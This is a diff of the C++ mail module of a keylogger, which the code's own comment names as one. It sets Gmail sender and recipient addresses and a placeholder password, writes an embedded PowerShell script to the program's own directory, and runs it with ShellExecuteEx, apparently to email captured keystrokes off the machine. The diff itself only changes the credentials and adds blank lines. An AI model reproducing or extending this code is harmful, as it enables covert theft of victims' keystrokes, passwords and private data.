@@ -15,9 +15,9 @@ namespace Mail {
 
     // keylogger works with gmail email by default
     // other type of emails may not work
+    #define X_EM_TO   "something@gmail.com"
     #define X_EM_FROM "something@gmail.com"
-    #define X_EM_TO "something@gmail.com"
-    #define X_EM_PASS "qwertyu"
+    #define X_EM_PASS "qwerty1234"
 
 //No need to change the following content
 const std::string &PowerShellScript =
@@ -65,11 +65,13 @@ const std::string &PowerShellScript =
     std::string StringReplace(std::string s, const std::string &what, const std::string &with) {
 
         if(what.empty()) {
+
             return s;
         }
         size_t sp = 0; // sp - String Position
 
         while((sp = s.find(what, sp)) != std::string::npos) { // npos = our string to termination
+
             s.replace(sp, what.length(), with), sp += with.length();
         }
         return s;
@@ -86,11 +88,14 @@ const std::string &PowerShellScript =
         std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
 
         if(!script) { // checks if the file was created
+
             return false;
         }
+
         script << PowerShellScript;
 
         if(!script) { // checks if the file was written
+
             return false;
         }
 
@@ -109,15 +114,18 @@ const std::string &PowerShellScript =
         ok = IO::MkDir(IO::GetOurPath(true));
 
         if(!ok) { //If !ok is evaluated to true, the directory is not created
+
             return -1;
         }
 
         std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
         if(!CheckFileExists(scr_path)) {
+
             ok = CreateScript();
         }
 
         if(!ok) { // checks if the creation of the file was successful
+
             return -2; // creation was unsuccessful
         }
 
@@ -148,8 +156,10 @@ const std::string &PowerShellScript =
         ShExecInfo.hInstApp = NULL; // this handles the instance
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
+
         // in the case that the script cannot be executed
         if(!ok) {
+
             return -3;
         }
 
